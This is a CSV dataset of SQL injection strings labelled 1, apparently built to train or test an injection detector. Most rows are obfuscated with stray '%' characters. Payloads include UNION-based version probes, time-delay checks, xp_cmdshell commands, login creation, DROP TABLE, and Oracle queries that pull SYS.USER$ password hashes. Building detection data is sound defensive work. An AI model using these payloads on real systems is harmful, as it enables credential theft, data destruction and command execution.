Query,Label
" se%l%e%c%t * %%fr%%om users %%wh%er%%e id  =  1 %%u%%n%i%%o%n se%l%e%c%t !<1,version  (    )   -- 1",1
" s%%e%%l%e%ct * %%f%%r%om users %%w%he%%re id  =  '1' %%u%%n%%ion s%%e%%l%e%ct \#,@@VERSION -- 1'",1
" %s%%e%l%%e%%c%t * %%from users %%w%%h%e%%r%e id  =  1 %or 1#""{ %u%%n%%i%on %s%%e%l%%e%%c%t 1,version  (    )   -- 1",1
""" %or true--",1
%%s%elec%t * %f%r%%om users %%w%h%%e%%r%%e id  =  1. o%%r 1  =  1 -- 1,1
" %%sel%%e%%ct * %%f%%r%om users %w%%h%%e%r%%e id  =  1 %o%%r @#"",  =  1 %u%n%i%o%n %%sel%%e%%ct 1,version  (    )   -- 1",1
" se%%le%c%t * %%f%%r%%o%m users w%h%e%%r%%e id  =  1 %%o%%r "";@"" %%o%%r 1  =  1 -- 1",1
â %o%r 3  =  3 --,1
 %a%n%d 1  =  utl_i%%naddr.get_host_address   (    (   s%%e%lect global_name %fr%om global_name   )    )    %a%n%d 'i'  =  'i,1
" %s%e%l%%e%%c%%t * fr%%o%m users %wh%%er%e id  =  1 +1 un%i%on %s%e%l%%e%%c%%t %%n%u%%ll,banner fr%%o%m v$version %wh%%er%e rownum  =  1 -- 1",1
" %%se%l%e%%ct * %%f%ro%%m users %w%he%re id  =  1 %%or "",,""  =  1 %%or 1  =  1 -- 1",1
" se%lec%t * f%ro%m users %wh%er%e id  =  1 + $+%1 %%u%n%%i%%o%n se%lec%t %n%u%l%l,@@VERSION -- 1",1
" %sel%e%%c%t * f%ro%m users %w%%h%%e%r%e id  =  1 o%r 1#""? %u%%nio%n %sel%e%%c%t version  (    )  ,version  (    )   -- 1",1
" s%e%%l%%e%%ct * %%f%%r%%om users whe%%r%e id  =  1 o%%r ""  )  1"" o%%r 1  =  1 -- 1",1
 %%o%r uid %%like '%,1
se%le%%ct * %%fro%m users %w%%h%e%re id  =  '1' <@&1 %%o%%r 1  =  1 -- 1',1
" s%e%l%%e%c%%t * %fr%%om users %w%%h%e%%r%e id  =  '1' uni%on s%e%l%%e%c%%t !<1,version  (    )   -- 1'",1
23 %o%%r 1  =  1; --,1
" s%e%%l%%e%%ct * %%fro%%m users %wh%%er%%e id  =  1 o%%r \<\. %u%ni%%o%n s%e%%l%%e%%ct 1,@@VERSION -- 1",1
" %%s%%e%%le%c%t * fr%o%%m users %w%h%e%r%e id  =  1 or ""{  (  ""  =  1 or 1  =  1 -- 1",1
" s%%e%%l%ec%t * %%from users %w%h%e%r%e id  =  1 o%r ""%_"" o%r 1  =  1 -- 1",1
%%s%%el%%ect * %f%%r%o%%m users %wh%%e%%re id  =  1 +   (  \.  )   %o%%r 1  =  1 -- 1,1
" se%l%%e%%ct * %%fr%om users wh%er%%e id  =  '1' u%%n%io%%n se%l%%e%%ct \,@@VERSION -- 1'",1
0 %%o%r 1  =  1,1
%s%e%l%ec%%t * %f%r%%om users %%whe%%re id  =  1 &@ %%o%r 1  =  1 -- 1,1
"adm%i%n""  )   o%%r ""1""  =  ""1",1
%s%e%%le%%ct * %f%%ro%%m users %w%h%er%e id  =  1 %or \<   =  1 %or 1  =  1 -- 1,1
" %%se%l%%e%c%t * %fr%o%%m users %%whe%%re id  =  1 o%r ""??"" o%r 1  =  1 -- 1",1
" an%d 1  =  utl_%%i%%naddr.get_host_address   (    (   %%s%%el%ect D%i%sT%%i%%nCT  (  PASSWo%%rD  )   %f%%r%%om   (  %%s%%el%ect D%i%sT%%i%%nCT  (  PASSWo%%rD  )  , ROWNUM AS l%im%it %f%%r%%om SYS.USER$  )   %%w%h%e%re l%im%it  =  5   )    )    an%d 'i'  =  'i",1
" %%a%%n%%d 1  =  utl_i%%naddr.get_host_address   (    (   s%ele%%c%%t DisTi%%nCT  (  column_name  )   f%r%%o%%m   (  s%ele%%c%%t DisTi%%nCT  (  column_name  )  , ROWNUM AS %l%%i%%m%%i%t f%r%%o%%m all_tab_columns  )   %%wh%%e%r%%e %l%%i%%m%%i%t  =  7   )    )    %%a%%n%%d 'i'  =  'i",1
&apos; o%%r,1
sqlvuln;,1
s%%el%ec%%t * %%f%rom users w%her%e id  =  1 + $+%$ %o%r 1  =  1 -- 1,1
s%e%%le%%ct * %%f%r%o%%m users %whe%%r%e id  =  '1' + $+%\ %or 1  =  1 -- 1',1
""" %%or """"*""",1
"hi or 1  =  1 --""",1
" %%s%e%le%%c%%t * %f%%r%%o%m users w%%h%e%re id  =  1. un%io%%n %%s%e%le%%c%%t %%n%u%%ll,banner %f%%r%%o%m v$version w%%h%e%re rownum  =  1 -- 1",1
; exec master..xp_cmdshell 'p%ing 172.10.1.255'--,1
" %%se%l%e%ct * fr%om users %w%he%r%%e id  =  '1' %%or 1^  =  1 u%n%%io%n %%se%l%e%ct 1,banner fr%om v$version %w%he%r%%e rownum  =  1 -- 1'",1
" %%s%ele%ct * fro%%m users w%he%%r%e id  =  '1' %%u%%n%%io%n %%s%ele%ct ""?""_,version  (    )   -- 1'",1
%s%%el%e%%c%%t * %f%ro%%m inf%o%rmation_schema.%t%%ab%%les--,1
%s%%ele%%c%%t * %%fr%%o%%m users wher%e id  =  1 %%o%r \<\. %%o%r 1  =  1 -- 1,1
   (  %s%%el%ect top 1,1
Ã½ %o%%r 1  =  1 --,1
a' --,1
 o%r 1  =  1 /*,1
" %sel%%ec%%t * from users %w%%h%e%%r%e id  =  1 %o%r 1#"", u%n%%io%n %sel%%ec%%t n%%u%%l%%l,version  (    )   -- 1",1
" s%%e%%l%%ec%t * %f%r%o%m users %whe%%r%%e id  =  '1' u%n%%io%%n s%%e%%l%%ec%t $ .,@@VERSION -- 1'",1
--,1
"exec sp_addlog%%i%n 'name' , 'passw%ord'",1
" %s%%el%%ect * %%f%r%o%m users %w%he%r%e id  =  1   %u%nio%n %s%%el%%ect n%u%%ll,banner %%f%r%o%m v$version %w%he%r%e rownum  =  1 -- 1",1
0x77616974666F722064656C61792027303A303A31302700 exec  (  @s  ) ,1
" %se%l%e%%c%%t * f%r%%om users w%%h%%e%%r%%e id  =  1 or "".  )  "" or 1  =  1 -- 1",1
" %%s%%elec%%t * %fr%o%%m users %%whe%%re id  =  1 %o%r @<@  =  1 %%u%ni%on %%s%%elec%%t 1,version  (    )   -- 1",1
group b%y userid hav%ing 1  =  1--,1
" %%s%e%le%ct * fr%om users %wh%e%r%%e id  =  1 + \+%1 u%ni%o%n %%s%e%le%ct %nu%l%%l,@@VERSION -- 1",1
%s%e%%l%ec%%t * %fr%o%%m users %%whe%%r%%e id  =  1 *1 o%%r 1  =  1 -- 1,1
" %s%%e%le%%c%t * %%fr%o%m users %w%h%%e%%r%%e id  =  1 %o%r @#"";  =  1 %o%r 1  =  1 -- 1",1
‘ %o%r 1  =  1 --,1
" %%s%e%%lec%t * %%f%r%%om users w%%h%e%%re id  =  1 *\. %un%i%o%n %%s%e%%lec%t %n%ul%l,@@VERSION -- 1",1
%s%e%%l%%e%%ct * fr%o%m users w%%h%%er%e id  =  1 %  (  @  )   %or 1  =  1 -- 1,1
%o%%r 'a'  =  'a,1
declare @s varchar  (  22  )   %se%le%c%t @s   = ,1
" s%e%l%%e%c%%t * %f%r%o%m users %%w%%her%e id  =  1 %%u%%nio%%n s%e%l%%e%c%%t 1<@,version  (    )   -- 1",1
" s%e%%le%%c%t * fr%o%%m users %wh%%ere id  =  1 + \+*\ %%u%nion s%e%%le%%c%t %nu%l%l,@@VERSION -- 1",1
" %%s%e%%le%%c%%t * %%f%r%om users %w%%her%e id  =  1 o%%r 1#"". %%u%n%i%o%%n %%s%e%%le%%c%%t version  (    )  ,version  (    )   -- 1",1
@variable,1
; exec master..xp_cmdshell,1
%s%%e%l%%ec%t * %fr%om users %%wh%er%e id  =  1 +  (  1  )   %or 1  =  1 -- 1,1
" %s%%el%%e%c%t * %f%%r%om users wh%%e%%r%%e id  =  1 %%un%%i%on %s%%el%%e%c%t @ 1$,version  (    )   -- 1",1
" %s%el%e%%ct * %f%%r%%om users w%he%%re id  =  1 %u%nio%n %s%el%e%%ct @ 1a,version  (    )   -- 1",1
" %s%el%ec%t * %%f%r%o%%m users w%%h%%e%%r%e id  =  1 %%o%r  @$#  =  1 %uni%%o%n %s%el%ec%t 1,version  (    )   -- 1",1
" s%%e%%lec%t * %%fr%%o%%m users %wh%%e%re id  =  '1' %%or   (  \.  )    =  1 %%unio%n s%%e%%lec%t 1,@@VERSION -- 1'",1
 a%nd 1 i%n   (  %%s%%e%%l%ect var fro%%m temp  )  --,1
" %s%e%l%e%%c%%t * %%f%r%om users %%w%%he%%re id  =  '1' %%u%n%%i%%o%%n %s%e%l%e%%c%%t 1""!"",banner %%f%r%om v$version %%w%%he%%re rownum  =  1 -- 1'",1
" se%l%ec%t * %f%rom users %w%h%%er%e id  =  1 or ""1]"" or 1  =  1 -- 1",1
" s%%e%l%%ec%%t * %f%%r%%o%m users %%w%h%%e%%re id  =  1 o%r ""$?"" o%r 1  =  1 -- 1",1
or x  =  x,1
o%r a  =  a,1
%o%r '1'  =  '1,1
" s%e%l%e%%ct * f%r%%o%%m users %%w%%h%e%%r%e id  =  11<1# %u%%ni%%o%n s%e%l%e%%ct 1,version  (    )   -- 1",1
   )    )    %o%r    (    (   'x'   )    )     =     (    (   'x,1
" s%e%l%e%c%%t * %%f%ro%m users whe%%r%%e id  =  '1' o%%r \.<1 %u%%n%i%%o%%n s%e%l%e%c%%t 1,@@VERSION -- 1'",1
" s%%e%%l%%e%%c%%t * %%f%%r%%o%m users %%whe%r%%e id  =  '1' <@&1 u%n%%io%n s%%e%%l%%e%%c%%t 1,version  (    )   -- 1'",1
" %a%%n%%d 1  =  utl_%i%naddr.get_host_address   (    (   s%%e%%l%%e%%ct Di%%sT%i%nCT  (  ta%b%le_name  )   %%f%%rom   (  s%%e%%l%%e%%ct Di%%sT%i%nCT  (  ta%b%le_name  )  , ROWNUM AS li%%m%i%%t %%f%%rom sys.all_ta%b%les  )   %w%%h%%e%%r%e li%%m%i%%t  =  4   )    )    %a%%n%%d 'i'  =  'i",1
; if %i%%s_srvrolemember  (  'sysadm%%in'  )   > 0 waitfo%%r delay '0:0:2' --,1
se%l%ect * %%fr%o%m users %%w%%h%e%%re id  =  1 <@<@ %o%%r 1  =  1 -- 1,1
" s%e%%l%%e%%c%t * %%fr%%om users %w%%h%%e%r%e id  =  1 un%%i%%o%n s%e%%l%%e%%c%t @<@$,version  (    )   -- 1",1
" %%s%%e%%l%%ec%%t * %f%%r%om users w%h%e%r%%e id  =  '1' <@<@ %un%io%%n %%s%%e%%l%%ec%%t 1,version  (    )   -- 1'",1
" %s%el%e%%c%t * %%fro%%m users %%wh%e%r%e id  =  1 or ""$_"" or 1  =  1 -- 1",1
" %%sel%%e%%c%%t * %f%rom users w%%he%r%%e id  =  1 or 1#""{ %u%n%%i%%o%n %%sel%%e%%c%%t version  (    )  ,version  (    )   -- 1",1
a' %%o%%r 1  =  1--,1
 )   %o%%r   (  a  =  a,1
"""   )    )    o%%r    (    (   ""x""   )    )     =     (    (   ""x",1
" %%sel%%e%c%t * %%f%ro%m users %%wh%e%%r%e id  =  1 %o%%r 1#""; %o%%r 1  =  1 -- 1",1
" %s%%e%le%%c%t * %%fr%%o%m users wh%%ere id  =  '1' <@$_ %uni%%o%%n %s%%e%le%%c%t 1,version  (    )   -- 1'",1
-- &passw%o%%rd  = ,1
s%elect * %%f%r%o%%m users %%w%%h%%e%re id  =  1 <@. %o%r 1  =  1 -- 1,1
" sel%%e%%c%t * %fr%%o%%m users %%w%%h%e%%r%%e id  =  1 %%or ""  (    )  "" %%or 1  =  1 -- 1",1
" %s%e%%le%%c%t * %%fr%om users %%w%%here id  =  1 %$ 1 un%%io%n %s%e%%le%%c%t n%u%l%l,@@VERSION -- 1",1
" %%a%%n%d 1  =  utl_i%naddr.get_host_address   (    (   sel%%e%c%%t Di%sTi%nCT  (  granted_role  )   %%f%%ro%%m   (  sel%%e%c%%t Di%sTi%nCT  (  granted_role  )  , ROWNUM AS %l%%i%m%%it %%f%%ro%%m dba_role_privs %w%%here GRANTEE  =  SYS.LOGi%nUSER  )   %w%%here %l%%i%m%%it  =  3   )    )    %%a%%n%d 'i'  =  'i",1
 o%%r '1'  =  '1,1
adm%%i%n' %or 1  =  1,1
" %%s%%e%%le%%ct * f%r%%o%%m users %%w%%h%ere id  =  1 %%or "";,""  =  1 %%or 1  =  1 -- 1",1
" sel%e%c%%t * fr%om users w%%h%e%re id  =  1 %u%%n%%ion sel%e%c%%t @||1,version  (    )   -- 1",1
" se%%lect * %%from users %%wher%%e id  =  1 +\+. %%uni%%on se%%lect n%u%ll,@@VERSION -- 1",1
" %%s%e%l%%e%c%%t * %fr%om users %w%h%er%e id  =  1 o%%r ""  )  ,"" o%%r 1  =  1 -- 1",1
" %u%%n%i%%on s%%e%l%e%%c%%t * %f%rom users %wh%%er%e log%i%n   =   char  (  114,111,111,116  )  ;",1
" %%s%%e%%le%%ct * f%r%%o%m users w%%he%%r%%e id  =  1 %o%%r 1#""? %u%%n%io%%n %%s%%e%%le%%ct 1,version  (    )   -- 1",1
 o%r 1  =  1--,1
" %a%n%d 1  =  utl_i%%naddr.get_host_address   (    (   %%s%%e%%l%%ec%%t Di%sTi%%nCT  (  granted_role  )   %%f%%ro%%m   (  %%s%%e%%l%%ec%%t Di%sTi%%nCT  (  granted_role  )  , ROWNUM AS li%%m%i%%t %%f%%ro%%m dba_role_privs %w%h%e%%r%%e GRANTEE  =  SYS.LOGi%%nUSER  )   %w%h%e%%r%%e li%%m%i%%t  =  5   )    )    %a%n%d 'i'  =  'i",1
pg_sleep  (  __TIME__  )  --,1
‘ o%%r 3  =  3 --,1
" %s%%elect * %fro%%m users whe%r%e id  =  1 -1<@ %%u%%n%%io%%n %s%%elect 1,version  (    )   -- 1",1
" %s%el%e%c%%t * %fro%m users %w%h%%ere id  =  1 %or ""$#"" %or 1  =  1 -- 1",1
 )   %%u%%n%i%%on s%e%l%e%%c%t * %f%r%o%%m %%i%%nfo%rmation_schema.t%a%%bl%es;,1
" se%l%e%c%t * %%f%%rom users %%w%%he%r%%e id  =  1 %o%r ""  )  ]"" %o%r 1  =  1 -- 1",1
"  )   %or benchmark  (  10000000,MD5  (  1   )    )   #",1
 a%n%%d 1  =  utl_%%i%%naddr.get_host_address   (    (   %%s%%e%%l%%ec%%t COUNT  (  D%i%%sT%%i%%nCT  (  column_name   )    )    %%fr%o%m sys.all_tab_columns   )    )    a%n%%d 'i'  =  'i,1
" a%n%%d 1  =  utl_i%%naddr.get_host_address   (    (   %s%e%%l%%e%%ct D%i%%sTi%%nCT  (  t%%a%%b%l%%e_name  )   %%f%%r%%o%%m   (  %s%e%%l%%e%%ct D%i%%sTi%%nCT  (  t%%a%%b%l%%e_name  )  , ROWNUM AS %l%im%%i%%t %%f%%r%%o%%m sys.all_t%%a%%b%l%%es  )   w%%he%%re %l%im%%i%%t  =  7   )    )    a%n%%d 'i'  =  'i",1
""" o%r """" """,1
%%d%%el%e%%t%%e,1
;waitf%o%r delay '0:0:__TIME__'--,1
 %%or 1  =  1 --,1
1' and non_ex%istant_%%t%ab%le   =   '1,1
" %%s%%el%e%%c%t * %f%%r%o%%m users %%w%h%%e%%r%e id  =  1 o%%r ""&  )  "" o%%r 1  =  1 -- 1",1
" %%sele%%c%t * %%fr%%o%m users %%w%%h%ere id  =  '1' + $ . un%%i%o%n %%sele%%c%t 1,@@VERSION -- 1'",1
declare @s varchar  (  200  )   %s%ele%%c%%t @s   =   0x77616974 ...,1
x' %a%nd userid %%i%%s %%nu%%ll; --,1
" %se%l%e%ct * f%ro%m users w%%he%%r%e id  =  1 %or "";["" %or 1  =  1 -- 1",1
" %%s%ele%%ct * %f%r%o%m users %whe%re id  =  '1' %o%r \.<   =  1 u%%ni%%on %%s%ele%%ct 1,@@VERSION -- 1'",1
" s%%e%l%e%%c%t * %%f%rom users %wh%e%re id  =  1 u%n%i%%o%n s%%e%l%e%%c%t @<@,version  (    )   -- 1",1
" s%%ele%%c%%t * %f%%r%%o%m users %wh%%ere id  =  1 -@<@ u%%n%ion s%%ele%%c%%t 1,version  (    )   -- 1",1
 a%n%%d 1  =  utl_i%%naddr.get_host_address   (    (   %%s%%e%l%ec%t host_name from v$i%%nstance   )    )    a%n%%d 'i'  =  'i,1
" a%%nd 1  =  utl_%i%naddr.get_host_address   (    (   sel%%e%%ct D%isT%i%nCT  (  column_name  )   %f%%rom   (  sel%%e%%ct D%isT%i%nCT  (  column_name  )  , ROWNUM AS %%l%i%%mi%t %f%%rom all_tab_columns  )   where %%l%i%%mi%t  =  2   )    )    a%%nd 'i'  =  'i",1
%%sel%%e%%c%%t * fr%o%m users %%whe%%r%%e id  =  1 +   (  \+  )   %%or 1  =  1 -- 1,1
" se%l%%e%c%%t * %f%%r%%om users wh%%e%re id  =  1 %o%r "".["" %o%r 1  =  1 -- 1",1
" %sel%e%%c%%t * %%fro%%m users %%w%%h%%er%%e id  =  1 or ""  (  ["" or 1  =  1 -- 1",1
u%%n%io%%n ALL %se%%l%ec%t,1
" %s%%e%le%%ct * %%f%%r%%om users w%h%er%e id  =  1 or ""1#"" or 1  =  1 -- 1",1
%se%le%c%%t * f%%rom users %%w%%he%r%%e id  =  1 o%r \<1 o%r 1  =  1 -- 1,1
" %s%%el%%e%%c%%t * %%fr%%o%%m users wh%e%%r%%e id  =  1 | |1 %u%%n%%i%%o%%n %s%%el%%e%%c%%t 1,banner %%fr%%o%%m v$version wh%e%%r%%e rownum  =  1 -- 1",1
x' %%o%r full_name %l%%ik%e '%bob%,1
x' %an%%d members.email %i%%s %%nu%%l%%l; --,1
 %%or 2 > 1,1
%%s%%el%%e%c%t * %fr%%o%m users %w%%h%e%r%e id  =  1.*1 %or 1  =  1 -- 1,1
"""  )   %%o%%r pg_sleep  (  __TIME__  )  --",1
 ',1
" %s%%e%l%e%c%t * %%f%%r%o%%m users %%w%h%e%r%e id  =  1 %%or $<\. un%%ion %s%%e%l%e%c%t 1,@@VERSION -- 1",1
" %se%l%e%c%t * f%%r%om users %wh%%e%r%%e id  =  1 %%o%r ""@  )  "" %%o%r 1  =  1 -- 1",1
%sel%%e%%c%t * %%f%ro%m users w%%h%er%%e id  =  1 or \.<$ or 1  =  1 -- 1,1
 )   o%%r sleep  (  __TIME__  )    =  ',1
sleep 50',1
" s%e%l%%ect * %%f%%r%om users %%w%here id  =  '1' + 1||1 un%%io%n s%e%l%%ect 1,banner %%f%%r%om v$version %%w%here rownum  =  1 -- 1'",1
s%%e%%l%%ec%t * %f%%r%%o%%m users %wh%%e%%re id  =  1 + $+%\ or 1  =  1 -- 1,1
" %%s%%elec%%t * %%f%r%o%m users %w%%h%e%%re id  =  1 o%%r "";  (  "" o%%r 1  =  1 -- 1",1
%%o%r sleep  (  __TIME__  )    =  ',1
" %sele%%ct * fro%%m users w%h%%ere id  =  1 or "";_"" or 1  =  1 -- 1",1
" %%s%%el%%e%%ct * f%%r%%o%m users %w%%h%er%e id  =  1 %o%r 1#"". %%un%io%n %%s%%el%%e%%ct 1,version  (    )   -- 1",1
" %s%el%ec%%t * %%f%%r%o%%m users %%w%%h%%e%%r%e id  =  1 un%i%%o%n %s%el%ec%%t  @ $,version  (    )   -- 1",1
" s%e%%l%%ec%t * f%r%om users %w%%he%r%%e id  =  1 uni%o%%n s%e%%l%%ec%t +!<@,version  (    )   -- 1",1
" %select * %%f%r%o%m users %wh%%ere id  =  1 <@<@ %%%%u%%n%ion %select %nu%l%%l,version  (    )   -- 1",1
o%%r 2 > 1,1
; exec   (  'sel' + 'ect us' + 'er'  ) ,1
anyth%%ing' %or 'x'  =  'x,1
" se%l%%e%ct * %%f%ro%m users %wher%%e id  =  1 %%o%%r \<\ %uni%on se%l%%e%ct 1,@@VERSION -- 1",1
" %s%e%lect * fro%%m users w%h%%e%r%%e id  =  1 %un%%i%o%n %s%e%lect   (  1  )  ,banner fro%%m v$version w%h%%e%r%%e rownum  =  1 -- 1",1
" s%%ele%ct * f%r%%o%%m users %w%%here id  =  1 *  (  \  )   %u%%ni%o%n s%%ele%ct nu%l%l,@@VERSION -- 1",1
&',1
a' o%r 3  =  3--,1
" %sel%%e%ct * %f%%ro%m users %%whe%%r%e id  =  '1' or $+<$ %u%%n%i%%on %sel%%e%ct 1,@@VERSION -- 1'",1
" s%e%%l%e%%c%t * f%r%om users %%w%h%er%e id  =  1 +1 %u%%n%io%n s%e%%l%e%%c%t 1,banner f%r%om v$version %%w%h%er%e rownum  =  1 -- 1",1
"adm%%in""%%o%r 1  =  1 %%o%r """"  =  """,1
uni/**/on sel/**/ect,1
""" or """"&""",1
 )    )   ;waitf%%o%%r delay '0:0:__TIME__'--,1
" %%se%le%%c%%t * %f%%r%%o%%m users wher%%e id  =  1 %o%%r ""?;"" %o%%r 1  =  1 -- 1",1
1 waitf%or delay '0:0:10'--,1
bfilename,1
admi%n'  )   %%o%r   (  '1'  =  '1'--,1
UEf,1
 -- &passw%o%%rd  = ,1
1 %%or sleep  (  __TIME__  )  #,1
" a%%nd 1  =  utl_i%naddr.get_host_address   (    (   s%%el%e%%c%t D%i%sTi%nCT  (  %%t%a%%b%l%%e_name  )   fr%o%%m   (  s%%el%e%%c%t D%i%sTi%nCT  (  %%t%a%%b%l%%e_name  )  , ROWNUM AS %l%%i%m%it fr%o%%m sys.all_%%t%a%%b%l%%es  )   %w%%h%e%re %l%%i%m%it  =  6   )    )    a%%nd 'i'  =  'i",1
" %%s%e%le%%ct * %fr%om users %%w%%h%ere id  =  '1' %un%io%%n %%s%e%le%%ct $[""],@@VERSION -- 1'",1
" s%e%l%%e%ct * f%%r%om users %%wh%%e%%r%%e id  =  '1' + @  (  1  )   u%n%i%o%n s%e%l%%e%ct 1,version  (    )   -- 1'",1
1' %%a%%nd 1  =    (  %s%%e%l%%e%ct count  (  *  )   %fr%o%%m tabl%%enames  )  ; --,1
o%r sleep  (  __TIME__  )  #,1
" %a%n%d 1  =  utl_%i%%naddr.get_host_address   (    (   %%se%%l%e%%ct D%%i%sT%i%%nCT  (  granted_role  )   %%f%r%om   (  %%se%%l%e%%ct D%%i%sT%i%%nCT  (  granted_role  )  , ROWNUM AS %li%mi%%t %%f%r%om dba_role_privs wh%%e%%r%e GRANTEE  =  SYS.LOG%i%%nUSER  )   wh%%e%%r%e %li%mi%%t  =  8   )    )    %a%n%d 'i'  =  'i",1
" %s%%e%l%%ec%t * %%fr%%o%m users whe%re id  =  1 %or 1#"",  =  1 %or 1  =  1 -- 1",1
||6,1
%%o%r 1/*,1
" a%%n%d 1  =    (   if   (    (   load_file  (  char  (  110,46,101,120,116   )    )   <>char  (  39,39   )    )   ,1,0   )    )   ;",1
%%s%ele%c%%t * f%%ro%m users %w%he%r%%e id  =  1.%@ o%%r 1  =  1 -- 1,1
" %%se%l%e%c%%t * f%%r%%om users %%w%h%%e%%r%%e id  =  1 %%o%r ""..""  =  1 %%o%r 1  =  1 -- 1",1
" %s%%e%%l%e%%ct * %fr%o%m users %%wh%er%%e id  =  1 %or 1&@#  =  1 %%u%ni%on %s%%e%%l%e%%ct 1,version  (    )   -- 1",1
" %%s%%e%l%%ec%%t * %fr%%o%m users %w%%h%e%re id  =  1 %%o%%r "";]"" %%o%%r 1  =  1 -- 1",1
" %%o%%r 1  =  1 %%o%%r """"  =  ",1
" %%a%%nd 1  =  utl_%i%naddr.get_host_address   (    (   %%s%el%ect D%%i%sT%i%nCT  (  PASSW%%o%%rD  )   from   (  %%s%el%ect D%%i%sT%i%nCT  (  PASSW%%o%%rD  )  , ROWNUM AS %%l%%imi%t from SYS.USER$  )   w%he%%r%%e %%l%%imi%t  =  7   )    )    %%a%%nd 'i'  =  'i",1
%sel%%ect * %f%ro%m users %%w%h%er%e id  =  1 %or $<\. %or 1  =  1 -- 1,1
" %s%%e%lect * %f%%r%%om users w%h%er%e id  =  1 *  (  1  )   u%nio%%n %s%%e%lect 1,banner %f%%r%%om v$version w%h%er%e rownum  =  1 -- 1",1
%%or 'whatever' in   (  'whatever'  ) ,1
declare @s varchar   (  200  )   %se%%le%c%%t @s   =   0x73656c65637420404076657273696f6e exec  (  @s  ) ,1
%s%%e%lec%%t * f%r%%o%%m users %w%h%%e%r%%e id  =  '1'   %o%%r 1  =  1 -- 1',1
?,1
 %a%%n%d 1  =  utl_%i%%naddr.get_host_address   (    (   %s%%e%%l%%ec%%t COUNT  (  D%%i%sT%i%%nCT  (  tab%%l%%e_name   )    )    %%f%%r%om sys.all_tab%%l%%es   )    )    %a%%n%d 'i'  =  'i,1
" %se%l%e%%c%t * fr%%o%%m users %w%here id  =  '1' u%ni%on %se%l%e%%c%t @ 1,version  (    )   --  1'",1
"adm%%i%%n""  )   %or   (  ""1""  =  ""1""#",1
" %se%l%%e%%ct * %f%%r%o%%m users whe%r%e id  =  1 %or 1#"", %u%n%%i%on %se%l%%e%%ct 'a',version  (    )   -- 1",1
" s%el%%e%c%%t * %f%ro%%m users w%h%e%r%e id  =  1 %%o%r ""$  (  "" %%o%r 1  =  1 -- 1",1
 o%%r '' ',1
" se%%l%ect * %fr%om users w%her%%e id  =  1 o%r "";#"" o%r 1  =  1 -- 1",1
%o%%r 1  =  1,1
 ; dro%p %ta%%b%le temp --,1
" %%an%%d 1  =  utl_inaddr.get_host_address   (    (   s%%e%%le%ct Di%sTinCT  (  PASSW%%o%%rD  )   %%f%%r%o%m   (  s%%e%%le%ct Di%sTinCT  (  PASSW%%o%%rD  )  , ROWNUM AS l%%imit %%f%%r%o%m SYS.USER$  )   wher%%e l%%imit  =  2   )    )    %%an%%d 'i'  =  'i",1
""" %%o%%r benchmark  (  10000000,MD5  (  1   )    )   #",1
""" %o%%r ""x""  =  ""x",1
s%e%%l%e%%c%%t * %f%%r%%o%%m users %%w%%h%e%%re id  =  '1'<@.. %%o%%r 1  =  1 -- 1',1
" s%e%le%%c%t * fro%m users w%%h%%e%%r%e id  =  1 %%or !<@ un%%io%%n s%e%le%%c%t 1,version  (    )   -- 1",1
 %%or 'someth%i%ng' %%l%i%%k%%e 'some%',1
; if %n%%o%t   (    (   s%el%%e%%c%%t serverproperty  (  '%i%s%i%ntegratedsecurityonly'   )    )    <> 0  )   waitf%%o%%r delay '0:0:2' --,1
" %a%%n%%d 1  =  utl_%%i%%naddr.get_host_address   (    (   s%%e%%l%%e%c%%t Di%sT%%i%%nCT  (  PASSWorD  )   %%fr%%om   (  s%%e%%l%%e%c%%t Di%sT%%i%%nCT  (  PASSWorD  )  , ROWNUM AS %%li%%m%it %%fr%%om SYS.USER$  )   %%wh%e%%re %%li%%m%it  =  4   )    )    %a%%n%%d 'i'  =  'i",1
s%e%%l%%ec%t * f%%ro%m users wh%er%%e id  =  '1' %o%%r \<\. %o%%r 1  =  1 -- 1',1
; exec master..xp_cmdshell 'ping 10.10.1.2'--,1
adm%%i%%n' or '1'  =  '1'--,1
; if no%t   (    (   sel%e%%ct serverproperty  (  '%%i%s%%integratedsecurityonly'   )    )    <> 1  )   waitfo%r delay '0:0:2' --,1
" %an%%d 1  =  utl_inaddr.get_host_address   (    (   %s%%e%l%%ect DisTinCT  (  t%%a%%b%%l%e_name  )   %f%%r%o%%m   (  %s%%e%l%%ect DisTinCT  (  t%%a%%b%%l%e_name  )  , ROWNUM AS %%l%im%%i%%t %f%%r%o%%m sys.all_t%%a%%b%%l%es  )   %w%h%%e%%re %%l%im%%i%%t  =  2   )    )    %an%%d 'i'  =  'i",1
" s%%e%l%e%c%t * %%f%r%o%%m users %%wh%%ere id  =  1 <@<@ %%un%i%%on s%%e%l%e%c%t version  (    )  ,version  (    )   -- 1",1
